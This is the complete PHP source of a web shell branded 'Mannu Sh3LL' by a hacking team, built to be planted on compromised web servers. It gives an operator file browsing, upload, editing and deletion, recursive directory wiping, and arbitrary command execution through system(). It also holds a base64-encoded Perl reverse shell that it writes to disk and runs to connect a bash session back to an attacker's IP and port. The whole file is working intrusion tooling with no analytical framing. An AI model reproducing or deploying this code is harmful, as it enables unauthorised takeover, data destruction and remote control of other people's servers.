<?php session_start();
@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");

if(@$_SESSION['d']=='' || !@opendir($_SESSION['d']) || !@opendir($_SESSION['hd']))

{

$_SESSION['d'] = $_SESSION['hd'] = getcwd();

}


$head = '

<html>

<head>

<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLfLXmLeMSTt0jOXREfgvdp8IYWnE9_t49PpAiJNvwHTqnKkL4" rel="icon" type="image/x-icon"/>

</script>

<title>--==[[Mannu Sh3LL]]==--</title>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


<STYLE>

body {

font-family: Tahoma;

color: white;

background: #444444;

}


input {

border			: solid 2px ;

border-color		: black;

BACKGROUND-COLOR: #444444;

font: 8pt Verdana;


color: white;

}


submit {

BORDER:  buttonhighlight 2px outset;

BACKGROUND-COLOR: Black;

width: 30%;

color: #FFF;

}


#t input[type=\'submit\']{

	COLOR: White;

	border:none;

	BACKGROUND-COLOR: black;

}


#t input[type=\'submit\']:hover {

	

	BACKGROUND-COLOR: #ff9933;

	color: black;

	

}

tr {

BORDER: dashed 1px #333;

color: #FFF;

}

td {

BORDER: dashed 0px ;

}

.table1 {

BORDER: 0px Black;

BACKGROUND-COLOR: Black;

color: #FFF;

}

.td1 {

BORDER: 0px;

BORDER-COLOR: #333333;

font: 7pt Verdana;

color: Green;

}

.tr1 {

BORDER: 0px;

BORDER-COLOR: #333333;

color: #FFF;

}

table {

BORDER: dashed 2px #333;

BORDER-COLOR: #333333;

BACKGROUND-COLOR: #191919;;

color: #FFF;

}

textarea {

border			: dashed 2px #333;

BACKGROUND-COLOR: Black;

font: Fixedsys bold;

color: #999;

}

A:link {

border: 1px;

	COLOR: red; TEXT-DECORATION: none

}

A:visited {

	COLOR: red; TEXT-DECORATION: none

}

A:hover {

	color: White; TEXT-DECORATION: none

}

A:active {

	color: white; TEXT-DECORATION: none

}

</STYLE>

<script type="text/javascript">

<!--

    function lhook(id) {

       var e = document.getElementById(id);

       if(e.style.display == \'block\')

          e.style.display = \'none\';

       else

          e.style.display = \'block\';

    }

//-->

</script>

'; 




		echo $head ;

		echo '


<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >


			


       <td width="100%" align=center valign="top" rowspan="1">

           <font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ Mannu sHeLL</font><font color=white size=5 face="comic sans ms"><b>, By Team </font><font color=green size=5 face="comic sans ms"><b> INDIShEll]]==--</font> <div class="hedr"> 


        <td height="10" align="left" class="td1"></td></tr><tr><td 

        width="100%" align="center" valign="top" rowspan="1"><font 

        color="red" face="comic sans ms"size="1"><b> 

        <font color=#ff9933> 

        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font><br><font color=white>

        -==[[Greetz to]]==--</font><br> <font color=#ff9933>Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba ,Silent poison India,Magnum sniper,ethicalnoob Indishell,Local root indishell,Irfninja indishell<br>Reborn India,L0rd Crus4d3r,cool toad,Hackuin,Alicks,Gujjar PCP,Bikash,Dinelson Amine,Th3 D3str0yer,SKSking,rad paul,Godzila,mike waals,zoo zoo,cyber warrior,Neo hacker ICA<br>cyber gladiator,7he Cre4t0r,Cyber Ace, Golden boy INDIA,Ketan Singh,Yash,Aneesh Dogra,AR AR,saad abbasi,hero,Minhal Mehdi ,Raj bhai ji , Hacking queen ,lovetherisk and rest of TEAM INDISHELL<br>

<font color=white>--==[[Love to]]==--</font><br># My Father , my Ex Teacher,cold fire hacker,Mannu, ViKi,Jagriti,Suriya Cyber Tyson ,Ashu bhai ji,Rafay Baloch,Soldier Of God,Shafoon,Rehan Manzoor,almas malik, Bhuppi,Mohit, Ffe ^_^,Govind Singh,Shardhanand ,Budhaoo,Don(Deepika kaushik) and D3 <br>

<font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>GCE College ke DON :D</font>        <br></font>

        <b> 

        <font color=#ff9933> 

        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font>

						

           </table>

       </table> <br>


'; 



?>

<?php

////////////////////

if(isset($_POST['def']))

			{

			$takedown= $_SESSION['d']."/".trim($_POST['act']);

			unlink($takedown);

			}

if(isset($_POST['de']))

{

$uda=$_SESSION['d']."/".trim($_POST['act']);

deld($uda);

}			


function deld($path) 

	{

    $path = rtrim($path, '/').'/';

    $handle = opendir($path);

    while(false !== ($file = readdir($handle))) {

        if($file != '.' and $file != '..' ) {

            $fullpath = $path.$file;

            if(is_dir($fullpath)) 

			deld($fullpath); 

			else 

			unlink($fullpath);

        }

    }

    closedir($handle);

    rmdir($path);

}			


			

function listd($dirname)

{

$dirs=array();

$files=array();

$dir = opendir($dirname);


 chdir($dirname);

		while(false != ($file = readdir($dir)))

		{

					


								if(is_dir($file))

								{

										array_push($dirs,$file);

								}

								else

								{

								array_push($files,$file);

								}

					


		}

		return array($dirs,$files);


}

/////////////////////////



if(isset($_POST['df']))


{

 chdir($_SESSION['d']);

if (move_uploaded_file($_FILES['drag']['tmp_name'], $_FILES['drag']['name']))

 {

  echo "Uploaded successfully ";

}

}


			if(isset($_POST['d']))

			{

				if (@opendir(trim($_POST['di']))) 

				{

					$_SESSION['d'] = trim($_POST['di']);

				}

				else 

				{

					echo "<script>alert('Sorry bhai ji but directory is not readable ');</script>";

				}

			}

			elseif(isset($_POST['cd']) && @opendir($_SESSION['d'].'/'.trim($_POST['cd'])) )

			{

			if($_POST['cd']=='..')

			{

			$new = str_replace("\\","/",$_SESSION['d']);

			$new =str_replace("//","/",$new);

			$all=array_filter(explode('/',$new));

			

			$ct=count($all);

					

			if($all[0])

			{

				$a='';

				$ct=count($all)-1;

			}

			else

			{

				$a='/';

				$ct=count($all);

			}

			$ra=array();

			array_push($ra,$all[$ct]);

			$final=$a.implode('/',array_diff($all,$ra));

			$_SESSION['d']=$final;

			}

			else

			{

			$new = str_replace("\\","/",$_SESSION['d'])."/".trim($_POST['cd']);

			$new =str_replace("//","/",$new);

			if(@opendir($new))

			{

				$_SESSION['d']=$new;

			}

			

			}

			} elseif (isset($_POST['cd']) && $_POST['cd']=='@home@'){

				$_SESSION['d'] = $_SESSION['hd'];

			}

			if($_SESSION['d']=='')

			{

			$_SESSION['d'] = getcwd();

			}

				$all=listd($_SESSION['d']);

?>

<div align=center>--== <a href="#" onclick="lhook('sinfo');" style="border:1px;background:black;">BiLLu, Show/HiDe SeRvEr InF0</a> 

|| <a href="#" onclick="lhook('drg');" style="border:1px;background:black;">UpLoAd FiLe</a> ==--</div>

<div id="sinfo" style="display:none;"><table border=1 width=100%><td width=15% align=right><font color=red size=-2 face="comic sans ms">uname<br>server_ip<br>your_ip<br>server_software<br>disabled_functions</td><td><?php echo "<font size=-2>".php_uname()  ;?>	<br><?php echo "<font size=-2>".gethostbyname($_SERVER["HTTP_HOST"]);?><br><?php echo $_SERVER['REMOTE_ADDR'];?><br><?php echo $s_software = getenv("SERVER_SOFTWARE"); ?><br><?php $r=ini_get('disable_functions') ? ini_get('disable_functions'):'none'; echo $r;?>

	</table></div>

	

<div id="drg" style="display:none;"><form method=post enctype="multipart/form-data" style="margin: 0px 0px 0px 0px;">

file lo : <input type=file name=drag>

<input type=submit name=df value="chadaa de :|"></div>


<br>

<table width=100% style="border:0px;background:#191919;"> <tr style="vertical-align:top;"><td width=50%><a href="#" onclick="lhook('dlist');" style="border:1px;background:black;">DiReCtOrY cH</a> <form method="POST"><input type="hidden" name="act" value="@home@"/><button name="cd" style="border:1px;background:black;color:#F00;" value="@home@" type="submit">cd ~ (Home)</button></form><br>

<div id="dlist" style="display:none;"><form method=post style="margin: 5px 0px 0px 0px;">

<input type=text name=di value="<?php echo  $_SESSION['d'];?>" style="width: 300px;margin:0px 2px 10px"><input  type=submit name=d value="chal billu, Ghuma de sode n :3"></form></div></td>

<td align=left><a href="#" onclick="lhook('cmx');" style="border:1px;background:black;">CmD eXeCt</a><br>

<div id="cmx" style="display:none;"><form method=post style="margin: 5px 0px 0px 0px;"><input type=text name=cMe value="RuN falan-dhimka 25-50 :v" style="width: 300px;margin:0px 2px 10px"><input type=submit name=launchc value="eXeCuTe It LiKe A bOss"></form></div></td></tr></table><br>


<table width=80% style="border:0px;background:#444444;"> <tr style="vertical-align:top;">

	<td width=10%><div style="margin: 0px 0px 0px 10px;"><form method=post style="margin: 0px;padding: 0px;"><input type=submit name=cb value="Connect BaCk"></form></div></td>

	<td width=10%style="border:0px;background:#444444;"><a href="#" onclick="lhook('dcr');" style="border:1px;background:black;">Create Directory</a></td>

	<td width=20%><div id="dcr" style="display:none;">

		<form method=post style="margin: 0px;padding: 0px;"><input type=text name=dname value="<?php  if(is_writable($_SESSION['d'])) { echo "Directory name";} else { echo "directory is not writable";}?>"> &nbsp <input type=submit name=dcreate value="mkdir billu :) "></form></td>

		<td width=7%style="border:0px;background:#444444;"><a href="#" onclick="lhook('fcreate');" style="border:1px;background:black;">Create File</a></td>

	<td width=20%><div id="fcreate" style="display:none;">

		<form method=post style="margin: 0px;padding: 0px;"><input type=text name=fname value="<?php  if(is_writable($_SESSION['d'])) { echo "File name";} else { echo "directory is not writable";}?>"> &nbsp <input type=submit name=fcreate value="file create ;)"></form></td>

		</tr></table><br><hr>

<?php	

error_reporting(0);	

if(isset($_POST['dcreate']))

{

$result=mkdir(trim($_POST['dname']),0755);	

	

}

if(isset($_POST['fcreate']))

{

	fopen(trim($_POST['fname']),'w');

	fclose();

}

if(isset($_POST['edf'])  || isset($_POST['edif']) || isset($_POST['cb']) || isset($_POST['launchc']) || isset($_POST['cnt']))	

	

{

if(isset($_POST['edf']))

{

echo '<div align=center><form method="POST">

					<input type=hidden name=fname value='.trim($_POST['act']).'>

					<textarea cols=80 rows=20 name=cont>'.htmlspecialchars(file_get_contents($_SESSION['d'].'/'.trim($_POST['act']))).'</textarea><br /><input type=submit name=edif value="chal billu">';

}

if(isset($_POST['edif']))

			{

			$fna=fopen($_SESSION['d'].'/'.trim($_POST['fname']),'w');

			fwrite($fna,$_POST['cont']);

			}

if(isset($_POST['launchc']))

{  

?><textarea rows=20 cols=110><?php system(trim($_POST['cMe'])); ?></textarea>

<?php

}


if(isset($_POST['cb']))

{

	echo '<table border=1px style="margin: 0px 0px 0px 0px; padding:30px 30px 30px 30px;background:black;" width=30%><tr><td align=center>

	<form method=post>

	<input type=text name=p value="IP :P"> &nbsp <input type=text name=pr value="p0R7"><br><br> <input type=submit name=cnt value="ulta connect"></form></td></tr></table>';	

}

if(isset($_POST['cnt']))

{

	

	$i=$_POST['p'];

$p=$_POST['pr'];

$pp='IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnByaW50ICItLT09W1sgVGVhbSBJbmRpU2hlbGwgXV09PS0tXG4iOw0Kc3lzdGVtKCcvYmluL2Jhc2ggLWknKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOyA=';


$pbf=fopen('pb','w');

$r=base64_decode($pp);

fwrite($pbf,$r);

chmod('pb',0755);


$ec="perl pb ".$i." ".$p;

system($ec);

}


}

else

{

foreach($all[0] as $indir)

			{

			

			$final=$indir;

			

			echo "<table width=100% style=\"margin: 0px 0px 5px 0px;border:none;background:#191919;\"><tr><td><form method=post  style=\"margin: 0px 0px 0px 0px;\"><b><input type=hidden name=act value=\"".$final."\"><div id=t ><input type=submit name=cd  value=".$final." ></b> </div></td><td align=right width=10%>".substr(sprintf('%o', fileperms($final)), -4)."</td><td align=right width=20%><input type=submit name=de value=DeleTe></div></form></td></tr></table>";

			}

echo "<hr>";

			foreach($all[1] as $infile)

			{

			echo "<table width=100% style=\"margin: 0px 0px 1px 0px;border:none;background:#191919;\"><tr><td><form method=post  style=\"margin: 0px 0px 0px 0px;font-size:14px;\"><input type=hidden name=act value=\"".$infile."\">".$infile." </td><td align=right>".substr(sprintf('%o', fileperms($final)), -4)."</td><td align=right width=20%><input type=submit name=edf value=\"eDiT\"> &nbsp <input type=submit name=def value=\"uda de xD\"></form></td></tr></table>";

			}

			}		

			

			

?>
